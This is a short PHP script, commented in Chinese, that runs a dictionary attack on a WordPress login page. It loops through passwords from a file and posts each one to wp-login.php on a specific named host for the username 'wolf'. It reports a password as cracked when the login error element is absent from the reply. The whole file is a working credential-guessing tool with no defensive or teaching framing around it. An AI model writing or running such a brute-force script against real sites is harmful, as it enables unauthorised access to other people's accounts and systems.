<?php
require_once('HttpCurl.php');
// $start_time = time();
set_time_limit(0);
ini_set("memory_limit", "1024M");//设定一个脚本所能够申请到的最大内存字节数
$passwords = file('pass.txt');
echo '程序已开始运行====================================' . "\n\n";
$url = 'http://dev.fenikso.com/wp-login.php';
$cookielist = 'wordpress_test_cookie=WP+Cookie+check';
$crack = new HttpCurl();
$crack->set_request_url($url);
$crack->do_setcookie($cookielist);
foreach ($passwords as $pass) {
    $pass = trim($pass);
    $post = "log=" . urlencode('wolf') . "&pwd=" . urlencode($pass) . "&wp-submit=" . urlencode('登录') . "&redirect_to=". urlencode('http://dev.fenikso.com/wp-admin/') ."&testcookie=1";
    $crack->set_request_data($post);
    $res = $crack->send_pack('post',false,false,true);

    if (!$res['status']) {
        exit();
    }

    // 没有跟踪cookie时，通过header的302跳转和返回cookie判断已登陆成功
    // $f = fopen('a.txt', 'w');
    // fwrite($f, $res['data']);

    if (strpos($res['data'], 'div id="login_error"') === false) {
        echo 'username-------wolf' . '   password-------' . $pass . "\n\n";
    }else{
        echo '破解失败！' . "\n\n";
    }

}
exit('Game Over!');
?>